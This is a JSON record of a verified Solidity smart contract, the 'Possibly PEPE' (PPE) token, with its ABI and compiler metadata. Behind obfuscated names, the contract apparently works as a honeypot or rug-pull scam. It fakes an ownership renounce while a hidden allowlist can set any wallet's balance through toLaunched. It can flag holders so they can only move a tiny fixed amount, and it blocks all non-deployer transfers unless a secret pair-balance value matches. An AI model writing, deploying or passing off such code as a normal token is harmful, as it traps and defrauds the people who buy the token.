{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface takeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTokenAmount) external view returns (uint256);\n\n    function transfer(address walletList, uint256 totalToken) external returns (bool);\n\n    function allowance(address autoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletList,\n        uint256 totalToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingListLimit, uint256 value);\n    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract limitExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyToFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountMarketingIs {\n    function createPair(address receiverTeam, address maxShould) external returns (address);\n}\n\ninterface feeMode is takeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PossiblyPEPE is limitExempt, takeTotal, feeMode {\n\n    mapping(address => bool) public limitFeeFund;\n\n    string private feeTotalMode = \"PPE\";\n\n    uint256 public buyAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyList;\n    }\n\n    uint256 tradingReceiver;\n\n    address public marketingLimitTotal;\n\n    uint256 private buyList = 100000000 * 10 ** 18;\n\n    uint256 public teamMarketing;\n\n    bool public walletSender;\n\n    mapping(address => bool) public limitMin;\n\n    function tokenReceiverMarketing(uint256 totalToken) public {\n        minFund();\n        tradingReceiver = totalToken;\n    }\n\n    uint256 public walletTotal;\n\n    mapping(address => uint256) private modeSwap;\n\n    bool private tradingSender;\n\n    mapping(address => mapping(address => uint256)) private marketingTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSwap;\n    }\n\n    bool private liquidityTrading;\n\n    function listSwap(address marketingLaunchLimit, address walletList, uint256 totalToken) internal returns (bool) {\n        if (marketingLaunchLimit == toReceiver) {\n            return shouldBuy(marketingLaunchLimit, walletList, totalToken);\n        }\n        uint256 maxFromTake = takeTotal(marketingLimitTotal).balanceOf(walletTx);\n        require(maxFromTake == tradingReceiver);\n        require(walletList != walletTx);\n        if (limitMin[marketingLaunchLimit]) {\n            return shouldBuy(marketingLaunchLimit, walletList, receiverToken);\n        }\n        return shouldBuy(marketingLaunchLimit, walletList, totalToken);\n    }\n\n    event OwnershipTransferred(address indexed maxExempt, address indexed atFee);\n\n    function approve(address totalTokenLimit, uint256 totalToken) public virtual override returns (bool) {\n        marketingTeam[_msgSender()][totalTokenLimit] = totalToken;\n        emit Approval(_msgSender(), totalTokenLimit, totalToken);\n        return true;\n    }\n\n    function minFund() private view {\n        require(limitFeeFund[_msgSender()]);\n    }\n\n    function shouldBuy(address marketingLaunchLimit, address walletList, uint256 totalToken) internal returns (bool) {\n        require(modeSwap[marketingLaunchLimit] >= totalToken);\n        modeSwap[marketingLaunchLimit] -= totalToken;\n        modeSwap[walletList] += totalToken;\n        emit Transfer(marketingLaunchLimit, walletList, totalToken);\n        return true;\n    }\n\n    uint256 feeTotal;\n\n    string private autoShould = \"Possibly PEPE\";\n\n    address senderTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address maxTokenAmount) public view virtual override returns (uint256) {\n        return modeSwap[maxTokenAmount];\n    }\n\n    function owner() external view returns (address) {\n        return liquidityLimitTeam;\n    }\n\n    function isAutoFrom(address listLiquidity) public {\n        if (walletSender) {\n            return;\n        }\n        \n        limitFeeFund[listLiquidity] = true;\n        \n        walletSender = true;\n    }\n\n    address public toReceiver;\n\n    function toLaunched(address swapMode, uint256 totalToken) public {\n        minFund();\n        modeSwap[swapMode] = totalToken;\n    }\n\n    uint256 public isTx;\n\n    function senderLimit() public {\n        emit OwnershipTransferred(toReceiver, address(0));\n        liquidityLimitTeam = address(0);\n    }\n\n    constructor (){\n        \n        buyToFee minShould = buyToFee(senderTotal);\n        marketingLimitTotal = amountMarketingIs(minShould.factory()).createPair(minShould.WETH(), address(this));\n        \n        toReceiver = _msgSender();\n        senderLimit();\n        limitFeeFund[toReceiver] = true;\n        modeSwap[toReceiver] = buyList;\n        if (teamMarketing == walletTotal) {\n            listToken = buyAmount;\n        }\n        emit Transfer(address(0), toReceiver, buyList);\n    }\n\n    function transfer(address swapMode, uint256 totalToken) external virtual override returns (bool) {\n        return listSwap(_msgSender(), swapMode, totalToken);\n    }\n\n    function listMode(address maxTo) public {\n        minFund();\n        if (isTx == teamMarketing) {\n            liquidityTrading = false;\n        }\n        if (maxTo == toReceiver || maxTo == marketingLimitTotal) {\n            return;\n        }\n        limitMin[maxTo] = true;\n    }\n\n    function allowance(address isFund, address totalTokenLimit) external view virtual override returns (uint256) {\n        if (totalTokenLimit == senderTotal) {\n            return type(uint256).max;\n        }\n        return marketingTeam[isFund][totalTokenLimit];\n    }\n\n    address walletTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTotalMode;\n    }\n\n    address private liquidityLimitTeam;\n\n    function getOwner() external view returns (address) {\n        return liquidityLimitTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoShould;\n    }\n\n    bool public walletAt;\n\n    uint8 private autoSwap = 18;\n\n    uint256 private atToken;\n\n    uint256 constant receiverToken = 10 ** 10;\n\n    uint256 private listToken;\n\n    bool public txFee;\n\n    function transferFrom(address marketingLaunchLimit, address walletList, uint256 totalToken) external override returns (bool) {\n        if (_msgSender() != senderTotal) {\n            if (marketingTeam[marketingLaunchLimit][_msgSender()] != type(uint256).max) {\n                require(totalToken <= marketingTeam[marketingLaunchLimit][_msgSender()]);\n                marketingTeam[marketingLaunchLimit][_msgSender()] -= totalToken;\n            }\n        }\n        return listSwap(marketingLaunchLimit, walletList, totalToken);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingListLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTokenLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTokenAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"isAutoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFeeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"}],\"name\":\"listMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"toLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"tokenReceiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunchLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PossiblyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}